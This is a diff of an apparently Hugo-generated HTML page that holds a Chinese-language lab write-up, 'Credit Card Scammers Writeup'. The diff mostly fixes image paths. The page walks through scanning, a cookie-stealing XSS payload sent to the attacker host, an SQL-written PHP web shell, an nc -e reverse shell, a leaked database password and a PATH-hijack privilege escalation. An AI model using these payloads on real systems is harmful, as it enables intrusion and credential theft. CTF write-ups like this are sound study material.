@@ -8,7 +8,7 @@
 <meta name="author" content="">
 <meta name="description" content=" 此文章以 kali 地址为 10.10.10.5 为示例
 Credit Card Scammers 靶场 服务扫描 扫描所执行的命令，执行结果如下
-sudo nmap -sn 10.10.10.0/24sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
+sudo nmap -sn 10.10.10.0/24 sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
 sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt Web 渗透 审计爆破的目录发现在 admin 下有一个登入界面
 默认界面能找到提交表单
 尝试 XSS
@@ -51,7 +51,7 @@ python3 -m http.server 80 修改 cookie 登入
   <meta itemprop="name" content="Credit Card Scammers Writeup">
   <meta itemprop="description" content="此文章以 kali 地址为 10.10.10.5 为示例
 Credit Card Scammers 靶场 服务扫描 扫描所执行的命令，执行结果如下
-sudo nmap -sn 10.10.10.0/24sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
+sudo nmap -sn 10.10.10.0/24 sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
 sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt Web 渗透 审计爆破的目录发现在 admin 下有一个登入界面
 默认界面能找到提交表单
 尝试 XSS
@@ -67,7 +67,7 @@ python3 -m http.server 80 修改 cookie 登入
   <meta name="twitter:title" content="Credit Card Scammers Writeup">
   <meta name="twitter:description" content="此文章以 kali 地址为 10.10.10.5 为示例
 Credit Card Scammers 靶场 服务扫描 扫描所执行的命令，执行结果如下
-sudo nmap -sn 10.10.10.0/24sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
+sudo nmap -sn 10.10.10.0/24 sudo nmap --min-rate 10000 -p- 10.10.10.31 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 gobuster 爆破目录 在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破
 sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt Web 渗透 审计爆破的目录发现在 admin 下有一个登入界面
 默认界面能找到提交表单
 尝试 XSS
@@ -186,28 +186,28 @@ sudo nmap --min-rate 10000 -p- 10.10.10.31
 sudo nmap -sC -sT -sV -p22,80,443,9090 10.10.10.31 
 
 sudo nmap --script=vuln -p22,80,443,9090 10.10.10.31 
-</code></pre><p><img src="aaa.png" alt="aaa.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/aaa.png" alt="aaa.png"></p>
 <h2 id="gobuster-爆破目录">gobuster 爆破目录</h2>
 <p>在漏洞扫描中发现了许多目录，因此进行更详细的目录爆破</p>
 <pre tabindex="0"><code>sudo gobuster dir -u http://10.10.10.33 -w /usr/share/wordlists/dirb/common.txt
-</code></pre><p><img src="bbb.png" alt="bbb.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/bbb.png" alt="bbb.png"></p>
 <h1 id="web-渗透">Web 渗透</h1>
 <p>审计爆破的目录发现在 admin 下有一个登入界面</p>
-<p><img src="ccc.png" alt="ccc.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ccc.png" alt="ccc.png"></p>
 <p>默认界面能找到提交表单</p>
-<p><img src="ddd.png" alt="ddd.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ddd.png" alt="ddd.png"></p>
 <p>尝试 XSS</p>
 <pre tabindex="0"><code>&lt;script&gt;new Image().src=&#34;http://10.10.10.5/?c=&#34;+document.cookie;&lt;/script&gt;
 </code></pre><p><img src="ee.png" alt="ee.png"></p>
 <p>kali 架设连接</p>
 <pre tabindex="0"><code>python3 -m http.server 80
-</code></pre><p><img src="fff.png" alt="fff.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/fff.png" alt="fff.png"></p>
 <p>修改 cookie 登入</p>
-<p><img src="ggg.png" alt="ggg.png"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/ggg.png" alt="ggg.png"></p>
 <p>注入 sql 反弹 shell</p>
 <pre tabindex="0"><code>SELECT &#34;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&#34; INTO DUMPFILE &#39;/var/www/html/shell.php&#39;
 </code></pre><pre tabindex="0"><code>http://10.10.10.33/shell.php?cmd=pwd
-</code></pre><p><img src="hhh.png" alt="hhh.png"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/hhh.png" alt="hhh.png"></p>
 <p>连接 shell ，因为防火墙墙掉了不常见端口，因此使用 443 端口</p>
 <pre tabindex="0"><code>nc -e /bin/bash 10.10.10.5 4444
 </code></pre><p>以下是提权一阶段代码</p>
@@ -218,13 +218,13 @@ cd settings
 ls
 
 cat config.php
-</code></pre><p><img src="iii.png" alt="iii"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/iii.png" alt="iii"></p>
 <pre tabindex="0"><code>mysql -uorders -pOb2UA15ubBtzpZrvdMYT orders -e &#39;SELECT * from users;&#39; 
-</code></pre><p><img src="jjj.png" alt="jjj"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/jjj.png" alt="jjj"></p>
 <p>john 破解</p>
-<p><img src="kkk.png" alt="kkk"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/kkk.png" alt="kkk"></p>
 <p>ssh 登入</p>
-<p><img src="lll.png" alt="lll"></p>
+<p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/lll.png" alt="lll"></p>
 <p>二阶段提权</p>
 <pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
 
@@ -243,7 +243,7 @@ echo &#39;/bin/bash&#39; &gt; tar
 chmod 777 tar
 
 /usr/bin/backup
-</code></pre><p><img src="mmm.png" alt="mmm"></p>
+</code></pre><p><img src="content/posts/Credit%20Card%20Scammers%20Writeup/mmm.png" alt="mmm"></p>
 <p>拿下机器</p>
 
       </div>
@@ -305,6 +305,13 @@ chmod 777 tar
             </span>
             
 
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/darkhole-writeup/">
+                    <span class="button__text">DarkHole Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
             
         </div>
     </div>
